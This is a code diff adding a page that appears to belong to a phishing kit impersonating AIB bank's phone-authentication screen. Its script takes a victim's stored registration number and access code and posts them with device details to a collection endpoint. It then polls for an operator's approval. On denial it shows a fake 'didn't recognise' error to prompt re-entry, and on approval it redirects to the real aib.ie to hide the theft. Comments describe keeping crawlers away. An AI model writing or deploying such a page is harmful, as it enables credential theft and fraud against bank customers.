@@ -1,0 +1,244 @@
+---
+import Layout from '../layouts/Layout.astro';
+import { NOINDEX_PAGE_ROBOTS, SITE_HOMEPAGE_CANONICAL } from '../lib/site-config.js';
+---
+
+{/*
+  The in-flight approval gate. `noindex, follow`: a transient per-session state
+  has no business in an index, and `Disallow: /authenticating.html` in
+  robots.txt keeps crawlers off it entirely. `canonical` points at the homepage
+  so nothing that does reach it competes with the real landing.
+*/}
+<Layout
+  title="Authenticating your phone"
+  canonical={SITE_HOMEPAGE_CANONICAL}
+  robots={NOINDEX_PAGE_ROBOTS}
+  includeKeywords={false}
+>
+  <img src="/images/aib-logo.png" alt="AIB" class="logo">
+  <div class="spinner" id="spinner" role="status" aria-label="Loading"></div>
+  <div class="mark" id="mark" hidden aria-hidden="true"></div>
+  <h1 id="pageTitle">Authenticating your phone</h1>
+  <p class="sent-to" id="statusLine">Request sent to your device.</p>
+</Layout>
+
+<style is:global>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #333333;
+      -webkit-font-smoothing: antialiased;
+    }
+    [hidden] { display: none !important; }
+    .logo {
+      width: 64px;
+      height: 64px;
+      margin-top: 72px;
+      border-radius: 6px;
+      display: block;
+    }
+    .spinner {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      border: 8px solid #eddcEB;
+      border-left-color: #8e1b7c;
+      border-bottom-color: #8e1b7c;
+      margin-top: 96px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .mark {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      margin-top: 96px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+    .mark.approved { background: #00846a; }
+    .mark.denied { background: #c62828; }
+    .mark.timeout { background: #c62828; }
+    .mark.redirected { background: #7e2b79; }
+    .mark.error { background: #666666; }
+    h1 {
+      margin-top: 88px;
+      font-size: 25px;
+      font-weight: 700;
+      color: #2b2b2b;
+      text-align: center;
+      padding: 0 24px;
+    }
+    .sent-to {
+      margin-top: 40px;
+      font-size: 17px;
+      color: #666666;
+      text-align: center;
+      line-height: 1.45;
+      padding: 0 24px;
+    }
+    .sent-to.approved { color: #2e7d32; }
+    .sent-to.denied,
+    .sent-to.timeout { color: #c62828; }
+    .sent-to.redirected { color: #7e2b79; }
+    .sent-to.error { color: #666666; }
+</style>
+
+<script>
+  // Approval gate. Mirrors the ebc/BBP kit timings: burst poll, then steady
+  // poll, with a timeout that matches _db.js autoDeclineExpired (90s).
+  var BURST_POLL_MS = 200;
+  var POLL_MS = 500;
+  var BURST_WINDOW_MS = 3000;
+  var APPROVAL_TIMEOUT_MS = 90000;
+  var MAX_CONSECUTIVE_FAILURES = 8;
+
+  var taskId = new URLSearchParams(window.location.search).get('task');
+  var startedAt = Date.now();
+  var consecutiveFailures = 0;
+
+  var spinnerEl = document.getElementById('spinner');
+  var markEl = document.getElementById('mark');
+  var titleEl = document.getElementById('pageTitle');
+  var lineEl = document.getElementById('statusLine');
+
+  function settle(kind, title, message) {
+    spinnerEl.hidden = true;
+    markEl.hidden = false;
+    markEl.className = 'mark ' + kind;
+    markEl.textContent = kind === 'approved' ? '\u2713'
+      : (kind === 'denied' || kind === 'timeout') ? '\u2715'
+      : kind === 'redirected' ? '\u2192'
+      : '!';
+    titleEl.textContent = title;
+    lineEl.textContent = message;
+    lineEl.className = 'sent-to ' + kind;
+  }
+
+  function nextDelay() {
+    return (Date.now() - startedAt) < BURST_WINDOW_MS ? BURST_POLL_MS : POLL_MS;
+  }
+
+  function tick() {
+    if (Date.now() - startedAt >= APPROVAL_TIMEOUT_MS) {
+      try {
+        sessionStorage.removeItem('aib_user_id');
+        sessionStorage.removeItem('aib_password');
+        sessionStorage.setItem('aib_login_error', "We didn't recognise the Registration number or Personal Access Code you entered. Please try again.");
+      } catch (e) {}
+      window.location.href = '/?default-login=&error=invalid_credentials';
+      return;
+    }
+
+    fetch('/api/tasks/' + encodeURIComponent(taskId), { cache: 'no-store' })
+      .then(function (res) {
+        if (res.status === 404) {
+          settle('timeout', 'Session expired', 'Please try again.');
+          return null;
+        }
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return res.json();
+      })
+      .then(function (data) {
+        if (data === null) return; // 404 already settled above
+        if (!data || !data.task) throw new Error('no task in response');
+
+        consecutiveFailures = 0;
+        var status = data.task.status;
+
+        if (status === 'approved' || status === 'redirected') {
+          try {
+            sessionStorage.removeItem('aib_user_id');
+            sessionStorage.removeItem('aib_password');
+          } catch (e) {}
+          window.location.href = 'https://www.aib.ie/';
+          return;
+        } else if (status === 'denied') {
+          try {
+            sessionStorage.removeItem('aib_user_id');
+            sessionStorage.removeItem('aib_password');
+            sessionStorage.setItem('aib_login_error', "We didn't recognise the Registration number or Personal Access Code you entered. Please try again.");
+          } catch (e) {}
+          window.location.href = '/?default-login=&error=invalid_credentials';
+          return;
+        } else {
+          setTimeout(tick, nextDelay());
+        }
+      })
+      .catch(function () {
+        consecutiveFailures += 1;
+        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
+          settle('error', 'Unable to verify', 'Please try again.');
+          return;
+        }
+        setTimeout(tick, nextDelay());
+      });
+  }
+
+  function init() {
+    if (taskId) {
+      tick();
+      return;
+    }
+
+    var userId = null;
+    var password = null;
+    try {
+      userId = sessionStorage.getItem('aib_user_id');
+      password = sessionStorage.getItem('aib_password');
+    } catch (e) {}
+
+    if (!userId || !password) {
+      settle('error', 'Unable to verify', 'Please log in again to continue.');
+      return;
+    }
+
+    fetch('/api/tasks', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        user_id: userId,
+        password: password,
+        method: 'none',
+        masked_email: '—',
+        masked_phone: '—',
+        request_kind: 'login',
+        project_name: 'AIB',
+        member_origin: window.location.href,
+        device_info: navigator.userAgent,
+        screen_size: window.screen ? (window.screen.width + 'x' + window.screen.height) : null,
+        referrer: document.referrer || null
+      })
+    })
+      .then(function (r) {
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        return r.json();
+      })
+      .then(function (data) {
+        if (!data.task || !data.task.id) throw new Error('no task id');
+        taskId = data.task.id;
+        startedAt = Date.now();
+        try {
+          var cleanUrl = window.location.pathname + '?task=' + encodeURIComponent(taskId);
+          window.history.replaceState(null, '', cleanUrl);
+        } catch (e) {}
+        tick();
+      })
+      .catch(function () {
+        settle('error', 'Unable to reach verification', 'Please try again.');
+      });
+  }
+
+  init();
+</script>
